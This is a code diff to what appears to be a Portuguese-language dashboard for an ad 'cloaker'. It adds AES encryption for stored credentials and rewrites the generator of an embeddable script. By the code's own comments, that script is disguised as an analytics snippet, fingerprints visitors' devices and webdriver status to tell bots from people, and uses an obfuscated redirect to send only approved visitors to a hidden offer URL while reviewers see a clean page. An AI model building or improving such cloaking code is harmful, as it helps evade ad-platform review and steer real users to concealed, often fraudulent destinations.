@@ -570,6 +570,24 @@
             <h2>Configurações</h2>
             <div id="config-msg" class="alert"></div>
 
+            <!-- Proteção de Credenciais -->
+            <div class="config-section" style="border-color:rgba(59,130,246,0.3);">
+                <div class="config-section-title">🔐 Proteção de Credenciais (AES-256)</div>
+                <p style="color:var(--text-secondary);font-size:0.83rem;margin-bottom:1rem;line-height:1.5;">
+                    Senha usada para cifrar tokens e URLs no armazenamento local do navegador.<br>
+                    <strong style="color:var(--text-primary)">Não é salva</strong> — você digita uma vez por sessão. Sem ela, as credenciais ficam em texto normal no localStorage.
+                </p>
+                <div style="display:flex;gap:0.75rem;flex-wrap:wrap;align-items:flex-end;">
+                    <div class="form-group" style="flex:1;min-width:200px;margin-bottom:0;">
+                        <label>Senha de sessão</label>
+                        <input type="password" id="master-pw-input" placeholder="Min. 4 caracteres">
+                    </div>
+                    <button class="btn" style="flex-shrink:0;" onclick="setMasterPassword()">Ativar</button>
+                    <button class="btn btn-outline" style="flex-shrink:0;" onclick="clearMasterPassword()">Desativar</button>
+                </div>
+                <div id="mp-status" style="margin-top:0.75rem;font-size:0.83rem;"><span style="color:#94a3b8">Sem proteção ativa</span></div>
+            </div>
+
             <!-- Upstash -->
             <div class="config-section">
                 <div class="config-section-title">Upstash Redis — Logs</div>
@@ -616,9 +634,32 @@
     </main>
 </div>
 
+<!-- ══════════════ MODAL: Senha Mestra ══════════════ -->
+<div id="modal-pw-overlay" class="modal-overlay" style="display:none;">
+    <div class="modal" style="max-width:420px;">
+        <div style="text-align:center;margin-bottom:1.5rem;">
+            <div style="font-size:2.5rem;margin-bottom:0.75rem;">🔐</div>
+            <h3 style="font-size:1.15rem;font-weight:600;margin-bottom:0.5rem;">Credenciais Protegidas</h3>
+            <p style="color:var(--text-secondary);font-size:0.875rem;">
+                Suas credenciais estão criptografadas.<br>Digite a senha de sessão para acessar o dashboard.
+            </p>
+        </div>
+        <div class="form-group">
+            <label>Senha de sessão</label>
+            <input type="password" id="modal-master-pw" placeholder="Digite sua senha"
+                onkeydown="if(event.key==='Enter')confirmMasterPw()">
+        </div>
+        <div id="modal-pw-error" style="color:#f87171;font-size:0.83rem;margin-bottom:0.75rem;min-height:1.2rem;"></div>
+        <button class="btn" style="width:100%;" onclick="confirmMasterPw()">Desbloquear</button>
+        <button class="btn btn-outline" style="width:100%;margin-top:0.5rem;" onclick="skipMasterPw()">
+            Continuar sem proteção
+        </button>
+    </div>
+</div>
+
 <!-- ══════════════ MODAL: Script ══════════════ -->
 <div id="modal-overlay" class="modal-overlay" style="display:none;" onclick="closeModal(event)">
-    <div class="modal">
+    <div class="modal" id="modal-content-main">
         <div class="modal-header">
             <div>
                 <div style="font-size:0.72rem;text-transform:uppercase;letter-spacing:0.05em;color:var(--text-secondary);margin-bottom:0.3rem;">Script para</div>
@@ -872,22 +913,54 @@ function buildScript(camp) {
     const white = escJs(camp.whiteUrl || '');
     const cid   = escJs(camp.id);
 
-    // Payload disfarçado de evento de analytics (e:'pv' = pageview).
-    // NÃO envia a oferta nem a plataforma — o servidor resolve pelo id.
-    // A oferta (d.go) só volta para visitantes aprovados; bot recebe {ok:true}.
-    // Redirect ofuscado: nada de window.location.href literal com a URL à vista.
+    // ┌─ SCRIPT GERADO ────────────────────────────────────────────────────────┐
+    // │ • Aparência: snippet de analytics de dispositivo (comum em qualquer site)│
+    // │ • Payload: campos curtos {e,c,w,l,r,dp,mem,cpu,tp,wd,gl,ct}           │
+    // │ • A oferta NÃO está no script — o servidor resolve pelo campaignId     │
+    // │ • sessionStorage guard: previne loop infinito e re-execução na sessão  │
+    // │ • Redirect obfuscado: window["loc"+"ation"]["rep"+"lace"]()            │
+    // │ • whiteUrl: só redireciona se for domínio DIFERENTE do atual           │
+    // └────────────────────────────────────────────────────────────────────────┘
     return `<script>
 (function(){
-  var _s=window.screen||{},_n=navigator||{};
+  // Proteção contra loop infinito e re-fire na mesma sessão de navegador
+  if(sessionStorage.getItem('_ck'))return;
+  sessionStorage.setItem('_ck','1');
+
+  // Coleta fingerprint do dispositivo (parece analytics padrão)
+  function _wgl(){try{var c=document.createElement('canvas'),g=c.getContext('webgl')||c.getContext('experimental-webgl');if(!g)return'';var x=g.getExtension('WEBGL_debug_renderer_info');return x?(g.getParameter(x.UNMASKED_RENDERER_WEBGL)||''):''}catch(e){return''}}
+  var _n=navigator||{},_s=window.screen||{},_co=(_n.connection||{});
+
   fetch("${ep}",{
     method:"POST",
     headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({e:"pv",c:"${cid}",w:_s.width,l:_n.language,r:document.referrer})
-  }).then(function(r){return r.json();}).then(function(d){
+    body:JSON.stringify({
+      e:"pv",c:"${cid}",
+      w:_s.width,l:_n.language,r:document.referrer,
+      dp:window.devicePixelRatio||1,
+      mem:_n.deviceMemory||0,
+      cpu:_n.hardwareConcurrency||0,
+      tp:_n.maxTouchPoints||0,
+      wd:!!_n.webdriver,
+      gl:_wgl(),
+      ct:_co.effectiveType||''
+    })
+  }).then(function(r){return r.json()}).then(function(d){
     var g=d&&d.go;
-    if(g){if(!/^https?:\\/\\//i.test(g))g="https://"+g;var k="loc"+"ation";window[k].replace(g);}
-    else if("${white}"){var k2="loc"+"ation";window[k2].replace("${white}");}
-  }).catch(function(){});
+    if(g){
+      if(!/^https?:\\/\\//i.test(g))g="https://"+g;
+      window["loc"+"ation"]["rep"+"lace"](g);
+      return;
+    }
+    var w="${white}";
+    if(w){
+      // Só redireciona se for domínio DIFERENTE do atual — previne loop infinito
+      try{if(new URL(w).host!==location.host)window["loc"+"ation"]["rep"+"lace"](w);}catch(e){}
+    }
+  }).catch(function(){
+    // Erro de rede → limpa flag para permitir nova tentativa
+    sessionStorage.removeItem('_ck');
+  });
 })();
 <\/script>`;
 }
@@ -918,6 +991,7 @@ document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModalBt
 // ════════════════════════════════════════════════════════════
 //  Upstash helpers
 // ════════════════════════════════════════════════════════════
+// getUpstashCreds é alias sync para compat com código restante que não é async-crítico
 function getUpstashCreds() {
     const url   = localStorage.getItem('upstash_url');
     const token = localStorage.getItem('upstash_token');
@@ -926,7 +1000,7 @@ function getUpstashCreds() {
 }
 
 async function fetchAllLogs(limit) {
-    const { url, token } = getUpstashCreds();
+    const { url, token } = await getUpstashCredsAsync().catch(() => getUpstashCreds());
     const res = await fetch(`${url}/lrange/cloaker_logs/0/${limit - 1}`, {
         headers: { Authorization: `Bearer ${token}` }
     });
@@ -1099,16 +1173,155 @@ function switchTab(tabId) {
 }
 
 // ════════════════════════════════════════════════════════════
+//  Criptografia AES-GCM para credenciais no localStorage
+//  • Chave derivada via PBKDF2 de uma senha mestra (não salva)
+//  • Senha mestra fica só em sessionStorage (apagada ao fechar o browser)
+//  • Valores cifrados ficam com prefixo 'E2:' no localStorage
+//  • Se não houver senha mestra, funciona sem criptografia (compat)
+// ════════════════════════════════════════════════════════════
+const _SALT = 'cloaker_salt_v2';
+const _CRED_KEYS = ['gh_token','gh_repo','gh_branch','gh_path','vercel_url','upstash_url','upstash_token'];
+
+async function _deriveKey(password) {
+    const enc = new TextEncoder();
+    const km  = await crypto.subtle.importKey('raw', enc.encode(password), 'PBKDF2', false, ['deriveKey']);
+    return crypto.subtle.deriveKey(
+        { name:'PBKDF2', salt:enc.encode(_SALT), iterations:100000, hash:'SHA-256' },
+        km, { name:'AES-GCM', length:256 }, false, ['encrypt','decrypt']
+    );
+}
+async function _encryptVal(val, pw) {
+    const key = await _deriveKey(pw);
+    const iv  = crypto.getRandomValues(new Uint8Array(12));
+    const ct  = await crypto.subtle.encrypt({ name:'AES-GCM', iv }, key, new TextEncoder().encode(val));
+    const buf = new Uint8Array(12 + ct.byteLength);
+    buf.set(iv); buf.set(new Uint8Array(ct), 12);
+    return 'E2:' + btoa(String.fromCharCode(...buf));
+}
+async function _decryptVal(stored, pw) {
+    if (!stored.startsWith('E2:')) return stored;
+    const buf = Uint8Array.from(atob(stored.slice(3)), c => c.charCodeAt(0));
+    const key = await _deriveKey(pw);
+    const pt  = await crypto.subtle.decrypt({ name:'AES-GCM', iv:buf.slice(0,12) }, key, buf.slice(12));
+    return new TextDecoder().decode(pt);
+}
+function _getMasterPw() { return sessionStorage.getItem('_mp') || ''; }
+
+async function setCred(key, value) {
+    const pw = _getMasterPw();
+    localStorage.setItem(key, pw ? await _encryptVal(value, pw) : value);
+}
+async function getCred(key) {
+    const raw = localStorage.getItem(key) || '';
+    if (!raw.startsWith('E2:')) return raw;
+    const pw = _getMasterPw();
+    if (!pw) return ''; // cifrado mas sem senha na sessão
+    try { return await _decryptVal(raw, pw); } catch { return ''; }
+}
+function hasEncryptedCreds() {
+    return _CRED_KEYS.some(k => (localStorage.getItem(k)||'').startsWith('E2:'));
+}
+
+function setMasterPassword() {
+    const pw = document.getElementById('master-pw-input').value;
+    if (!pw || pw.length < 4) { showMessage('config-msg','Senha mestra deve ter pelo menos 4 caracteres.','error'); return; }
+    sessionStorage.setItem('_mp', pw);
+    document.getElementById('master-pw-input').value = '';
+    document.getElementById('mp-status').innerHTML = '<span style="color:#34d399">✓ Proteção ativa nesta sessão</span>';
+    showMessage('config-msg','Proteção ativada! Re-salve suas credenciais para cifrá-las.','success');
+    setTimeout(() => hideAllMessages(), 4000);
+}
+function clearMasterPassword() {
+    sessionStorage.removeItem('_mp');
+    document.getElementById('mp-status').innerHTML = '<span style="color:#94a3b8">Sem proteção ativa</span>';
+    showMessage('config-msg','Proteção removida desta sessão.','success');
+    setTimeout(() => hideAllMessages(), 3000);
+}
+
+async function confirmMasterPw() {
+    const pw = document.getElementById('modal-master-pw').value;
+    if (!pw) return;
+    const testKey = _CRED_KEYS.find(k => (localStorage.getItem(k)||'').startsWith('E2:'));
+    try {
+        await _decryptVal(localStorage.getItem(testKey), pw);
+        sessionStorage.setItem('_mp', pw);
+        document.getElementById('modal-pw-overlay').style.display = 'none';
+        document.getElementById('mp-status').innerHTML = '<span style="color:#34d399">✓ Proteção ativa nesta sessão</span>';
+        await loadAllConfig();
+        loadHome();
+    } catch {
+        document.getElementById('modal-pw-error').textContent = 'Senha incorreta. Tente novamente.';
+    }
+}
+async function skipMasterPw() {
+    document.getElementById('modal-pw-overlay').style.display = 'none';
+    await loadAllConfig();
+    loadHome();
+}
+
+async function loadAllConfig() {
+    document.getElementById('upstash-url').value   = await getCred('upstash_url')   || '';
+    document.getElementById('upstash-token').value = await getCred('upstash_token') || '';
+    document.getElementById('gh-token').value      = await getCred('gh_token')      || '';
+    document.getElementById('gh-repo').value       = await getCred('gh_repo')       || '';
+    document.getElementById('gh-branch').value     = await getCred('gh_branch')     || 'main';
+    document.getElementById('gh-path').value       = await getCred('gh_path')       || 'api/filtrar.mjs';
+    document.getElementById('vercel-url').value    = await getCred('vercel_url')    || '';
+    // Atualiza status da proteção
+    const mpActive = !!_getMasterPw();
+    const mpEl = document.getElementById('mp-status');
+    if (mpEl) mpEl.innerHTML = mpActive
+        ? '<span style="color:#34d399">✓ Proteção ativa nesta sessão</span>'
+        : (hasEncryptedCreds() ? '<span style="color:#eab308">⚠ Credenciais cifradas — ative a proteção</span>' : '<span style="color:#94a3b8">Sem proteção ativa</span>');
+}
+
+// Override das funções de config para usar armazenamento seguro
+async function saveUpstashConfig() {
+    const url   = document.getElementById('upstash-url').value.trim().replace(/\/$/, '');
+    const token = document.getElementById('upstash-token').value.trim();
+    if (!url || !token) { showMessage('config-msg','Preencha a URL e o Token.','error'); return; }
+    await setCred('upstash_url',   url);
+    await setCred('upstash_token', token);
+    const enc = !!_getMasterPw();
+    showMessage('config-msg', enc ? '🔐 Credenciais Upstash salvas com criptografia!' : 'Credenciais Upstash salvas!','success');
+    setTimeout(() => hideAllMessages(), 3000);
+}
+async function saveConfig(e) {
+    e.preventDefault();
+    const token     = document.getElementById('gh-token').value.trim();
+    const repo      = document.getElementById('gh-repo').value.trim();
+    const branch    = document.getElementById('gh-branch').value.trim()  || 'main';
+    const path      = document.getElementById('gh-path').value.trim()    || 'api/filtrar.mjs';
+    const vercelUrl = document.getElementById('vercel-url').value.trim().replace(/\/$/, '');
+    if (!token || !repo) { showMessage('config-msg','Preencha o Token e o Repositório.','error'); return; }
+    await setCred('gh_token',   token);
+    await setCred('gh_repo',    repo);
+    await setCred('gh_branch',  branch);
+    await setCred('gh_path',    path);
+    await setCred('vercel_url', vercelUrl);
+    const enc = !!_getMasterPw();
+    showMessage('config-msg', enc ? '🔐 Configurações salvas com criptografia!' : 'Configurações salvas!','success');
+    setTimeout(() => hideAllMessages(), 3000);
+}
+
+// getUpstashCreds precisa ser async agora
+async function getUpstashCredsAsync() {
+    const url   = await getCred('upstash_url');
+    const token = await getCred('upstash_token');
+    if (!url || !token) throw new Error('Configure e salve as credenciais do Upstash primeiro.');
+    return { url, token };
+}
+
+// ════════════════════════════════════════════════════════════
 //  Init
 // ════════════════════════════════════════════════════════════
-window.addEventListener('DOMContentLoaded', () => {
-    document.getElementById('upstash-url').value   = localStorage.getItem('upstash_url')   || '';
-    document.getElementById('upstash-token').value = localStorage.getItem('upstash_token') || '';
-    document.getElementById('gh-token').value      = localStorage.getItem('gh_token')      || '';
-    document.getElementById('gh-repo').value       = localStorage.getItem('gh_repo')       || '';
-    document.getElementById('gh-branch').value     = localStorage.getItem('gh_branch')     || 'main';
-    document.getElementById('gh-path').value       = localStorage.getItem('gh_path')       || 'api/filtrar.mjs';
-    document.getElementById('vercel-url').value    = localStorage.getItem('vercel_url')    || '';
+window.addEventListener('DOMContentLoaded', async () => {
+    // Se há credenciais cifradas mas sem senha na sessão → pedir senha
+    if (hasEncryptedCreds() && !_getMasterPw()) {
+        document.getElementById('modal-pw-overlay').style.display = 'flex';
+        return;
+    }
+    await loadAllConfig();
     loadHome();
 });
 </script>
